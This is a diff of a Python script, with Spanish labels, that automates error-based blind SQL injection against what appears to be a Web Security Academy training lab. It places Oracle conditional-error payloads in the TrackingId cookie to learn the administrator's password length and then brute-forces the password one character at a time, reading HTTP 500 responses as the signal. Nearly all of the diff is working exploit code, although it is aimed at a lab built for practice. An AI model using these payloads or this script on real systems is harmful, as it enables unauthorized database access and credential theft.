@@ -11,7 +11,9 @@ def def_handler(sig, frame):
 #Ctrl + C
 signal.signal(signal.SIGINT, def_handler)
 
-main_url = "https://0a49001304b3bf0e8221b03f003b0081.web-security-academy.net/"
+main_url = "https://0a7200180323284581d90c7c004500c9.web-security-academy.net/"
+tracking_id = "hOAmoxm6nve1TAYJZ9LbCGVzQByZ8R8B"
+session = "ypqP8OnEhUlBnWzS"
 characters = string.ascii_lowercase + string.digits
 
 def password_lenght_request():
@@ -21,20 +23,20 @@ def password_lenght_request():
     p2 = log.progress('Longitud Contraseña')
     while True:
             cookies = {
-                'TrackingId': "FmG1ydUVGLNtBRre'and (select 'a' from users where username = 'administrator' and length(password) > %d) = 'a" % (counter),
-                'session': 'VzQ06p2sA6B2ol4ylvDxQ6xVppF3Plvk'
+                'TrackingId': f"{tracking_id}'||(SELECT CASE WHEN '1' = '1' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password) > {counter})||'",
+                'session': f'{session}'
             }
             p1.status(cookies['TrackingId'])
             r = requests.get(main_url, cookies=cookies)
             p2.status(counter)
-            if 'Welcome back!' in r.text:
+            if r.status_code == 500:
                 counter += 1
             else:
                 break
     p2.success(counter)
     return counter
 
-def make_request():
+def make_request(longitud_contraseña):
     password = ''
     p1 = log.progress("Fuerza bruta")
     p1.status('Iniciando el ataque de fuerza bruta')
@@ -42,11 +44,11 @@ def make_request():
     time.sleep(2)
 
     p2 = log.progress('Password')
-    for position in range(1, 21):
+    for position in range(1, longitud_contraseña + 1):
         for character in characters:
             cookies = {
-                'TrackingId': "tjiKUGCYGVn8bHkR'||(SELECT CASE WHEN SUBSTR(password,%d,1)='%s' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" % (position, character),
-                'session': 'PXw7F9WNytqwKZJ1ropSWbvol047sWA9'
+                'TrackingId': f"{tracking_id}'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
+                'session': f'{session}'
             }
             p1.status(cookies['TrackingId'])
             p2.status(password)
@@ -58,5 +60,5 @@ def make_request():
 
 
 if __name__ == "__main__":
-    #longitud_contraseña = password_lenght_request()
-    make_request()#longitud_contraseña)
+    longitud_contraseña = password_lenght_request()
+    make_request(longitud_contraseña)
